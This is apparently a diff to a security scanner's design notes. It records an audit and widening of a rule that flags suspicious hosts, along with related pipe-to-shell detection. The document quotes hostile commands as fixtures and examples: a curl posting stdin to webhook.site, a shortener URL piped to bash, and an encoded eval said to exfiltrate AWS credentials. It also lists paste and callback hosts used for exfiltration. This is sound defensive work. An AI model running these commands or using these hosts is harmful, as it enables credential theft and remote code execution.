@@ -1194,6 +1194,34 @@ The code had drifted behind its own spec, and four issue-#105 shapes were invisi
 - **Confidence:** webhook sink 0.85; pastebin 0.8; shortener 0.6; raw host 0.6.
 - **Fixtures:** TP: `curl -d @- https://webhook.site/abc`. FP: link to `https://bit.ly/docs` in prose, POST to author's declared API.
 
+- **Corpus precision audit + widening (core-network 1.4.0, context 1.0.3, #367).** First full audit. The rule's
+  leaves are all `url_host`, so it can only fire in a file that names a listed host. Every such corpus bundle (5 of
+  1,036) was scanned. **9 hits in 5 bundles before:**
+  - `aws/rds-db2` ×5, `curl -sL https://bit.ly/getdb2driver | bash`: an opaque shortener piped to a shell. **TP by
+    capability**, even in the AWS anchor; SG-NET-002 also fires.
+  - `browser-use` ×2: the skill documenting its own `tunnel` command's output (`https://abc.trycloudflare.com`). The
+    skill really does expose a local port publicly. **Capability, kept.**
+  - `clawdefender` ×1 and `prompt-guard` ×1: security tools quoting `webhook.site` as the bad example. The known
+    benign-but-flagged class; **left**, since the strings are genuinely there.
+  - `skillject/marimo-development` ×1: **FP.** An embedded tweet's generated media anchor
+    (`<a href="https://t.co/…">pic.twitter.com/…</a>`) was the bundle's *only* finding and failed it at high. Fixed
+    by **`CTX-TWEET-EMBED`** (context pack), which caps the finding to low rather than suppressing it. The cap is
+    anchored to a line that is only the anchor, optionally wrapped in tags, so appending the anchor to a
+    `curl … | sh` line caps nothing (`TestTweetEmbedCapIsLineAnchored`). Whitespace in that regex is `[ \t]`: under
+    `(?m)` a leading `\s*` started the match on the blank line above and capped the wrong line. **After: 9 hits, 8
+    at original severity; marimo `fail → pass`.**
+- **Widened (recall).** The paste leaf gains `rentry.co`, `rentry.org`, `paste.ee`, `paste.rs`, `controlc.com`,
+  `justpaste.it`, `pastes.io` and `privatebin.net`: the ClawHub "openclaw-core" campaign staged on rentry, an
+  editable page whose payload changes while the skill URL does not. A new **out-of-band interaction** leaf at 0.85
+  adds interactsh's public servers (`oast.fun/.pro/.live/.site/.online/.me`), `oastify.com`, `burpcollaborator.net`
+  and `interact.sh`, which exist only to receive callbacks. **Every added host: 0 corpus files**, so no other bundle
+  could move. On `main`, the #367 probes (`rentry.co`, `rentry.org`, `paste.ee`) scanned `pass` and now `fail`.
+  `TestSuspiciousHostCoversPasteAndOOB`.
+- **Deliberately not added.** `requestcatcher.com` is scrapling's own echo test endpoint (~25 corpus lines in one
+  skill). The current ngrok domains (`ngrok.app`, `ngrok-free.app`) are also left out: the rule lists only ngrok's
+  **legacy** `ngrok.io`, so it misses every current free tunnel. But the corpus's only uses are webhook dev-setup
+  docs with placeholder subdomains, in three otherwise-benign bundles that would fail at high. That trade is a
+  decision, not a polish, so it's recorded here rather than shipped.
 ### SG-NET-002 — Pipe-to-shell execution  (AST01, critical) — **T1, very high precision** — **implemented** (`core-network`)
 > **Decoded-blob widening (core-network 1.3.0, #118).** The fetch-exec shapes with the fetch hidden inside an encoded
 > literal: `eval $(echo "Y3VybC…" | base64 -d)` (Snyk *ToxicSkills*; decodes to a curl exfiltrating `~/.aws/credentials`)
